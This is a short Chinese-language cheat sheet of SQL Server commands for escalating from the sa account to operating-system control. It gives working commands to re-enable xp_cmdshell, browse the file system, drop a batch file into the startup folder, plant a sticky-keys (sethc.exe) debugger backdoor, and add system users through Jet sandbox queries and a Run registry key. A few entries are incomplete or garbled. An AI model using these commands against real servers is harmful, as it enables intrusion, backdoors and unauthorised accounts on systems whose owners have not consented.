# SA提权：

## 1.判断扩展存储是否存在：

```sql
select count(*) from master.dbo.sysobjects where xtype = 'x' AND name= 'xp_cmdshell'
select count(*) from master.dbo.sysobjects where name='xp_regread'

```

恢复：

```sql
exec sp_dropextendedproc 'xp_cmdshell'
exec sp_dropextendedproc xp_cmdshell,'xplog70.dll'
EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;(SQL2005)

```

## 2.列目录：

```sql
exec master..xp_cmdshell 'ver'
(or) exec master..xp_dirtree 'c:\',1,1
(or) drop table black
     create TABLE black(mulu varchar(7996) NULL,ID int NOT NULL IDENTITY(1,1))-- 
     insert into black exec master..xp_cmdshell 'dir c:\' 
     select top 1 mulu from black where id=1

xp_cmdshell被删除时，可以用(4.a)开启沙盒模式，然后(4.b)方法提权

```

### 3.备份启动项：

```sql
  alter database [master] set RECOVERY FULL
  create table cmd (a image)
  backup log [master] to disk = 'c:\cmd1' with init
  insert into cmd (a) values (0x(batcode))
  backup log [master] to disk = 'C:\Documents and Settings\Administrator\「开始」菜单\程序\启动\start.bat'
  drop table cmd

```

### 4.映像劫持

```sql
  xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe','debugger','reg_sz','c:\windows\system32\cmd.exe'

```

### 5.沙盒模式提权：

方法a

方法b：

```sql
Select * From OpenRowSet('Microsoft.Jet.OLEDB.4.0',';Database=c:\windows\system32\ias\ias.mdb','select shell("net user mstlab mstlab /add")'); #or c:\windows\system32\ias\dnary.mdb string类型用此。
开启OpenRowSet：exec sp_configure 'show advanced options', 1;RECONFIGURE;exec sp_configure 'Ad Hoc Distributed Queries',1;RECONFIGURE;

```

### 6.xp_regwrite操作注册表

```sql
  exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Windows\currentversion un','black','REG_SZ','net user test test /add'
  开启xp_oacreate:exec sp_configure 'show advanced options', 1;RECONFIGURE;exec sp_configure 'Ole Automation Procedures',1;RECONFIGURE;

```

